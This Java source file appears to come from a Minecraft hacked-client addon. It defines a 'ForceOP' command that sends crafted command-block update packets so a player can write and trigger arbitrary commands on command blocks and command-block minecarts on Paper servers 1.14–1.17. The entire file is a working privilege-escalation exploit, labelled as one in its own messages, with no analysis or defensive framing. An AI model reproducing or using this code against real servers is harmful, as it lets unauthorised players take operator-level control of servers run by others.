package net.shadow.commands;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.systems.commands.Command;
import net.minecraft.block.Block;
import net.minecraft.block.BlockState;
import net.minecraft.block.Blocks;
import net.minecraft.block.entity.CommandBlockBlockEntity;
import net.minecraft.command.CommandSource;
import net.minecraft.entity.vehicle.CommandBlockMinecartEntity;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockMinecartC2SPacket;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.hit.HitResult;
import net.minecraft.util.math.BlockPos;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class ForceOpCommand extends Command {
    public ForceOpCommand() {
        super("ForceOP", "Edit command blocks on paper 1.14 - 1.17", "forceop", "editcmd");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(argument("command", StringArgumentType.greedyString()).executes(context -> {
            HitResult view = mc.crosshairTarget;
            String command = context.getArgument("command", String.class);
            if (view == null || view.getType() == HitResult.Type.MISS) {
                error("Look at a command block or command block minecart");
            } else if (view instanceof EntityHitResult ehr) {
                if (ehr.getEntity() instanceof CommandBlockMinecartEntity) {
                    info("Sending exploit");
                    mc.player.networkHandler.sendPacket(new UpdateCommandBlockMinecartC2SPacket(ehr.getEntity().getId(), command, false));
                    info("Sent exploit, try to activate the command block minecart");
                } else {
                    error("Look at a command block minecart");
                }
            } else if (view instanceof BlockHitResult bhr) {
                BlockPos bp = bhr.getBlockPos();
                BlockState bs = mc.world.getBlockState(bp);
                Block b = bs.getBlock();
                if (b == Blocks.COMMAND_BLOCK || b == Blocks.REPEATING_COMMAND_BLOCK || b == Blocks.CHAIN_COMMAND_BLOCK) {
                    info("Sending exploit");
                    mc.getNetworkHandler().sendPacket(new UpdateCommandBlockC2SPacket(bp, "", CommandBlockBlockEntity.Type.REDSTONE, false, false, false));
                    mc.getNetworkHandler().sendPacket(new UpdateCommandBlockC2SPacket(bp, command, CommandBlockBlockEntity.Type.REDSTONE, false, false, true));
                    info("Sent exploit, command block should self activate");
                } else {
                    error("Look at any type of command block");
                }
            }
            return SINGLE_SUCCESS;
        }));
    }
}
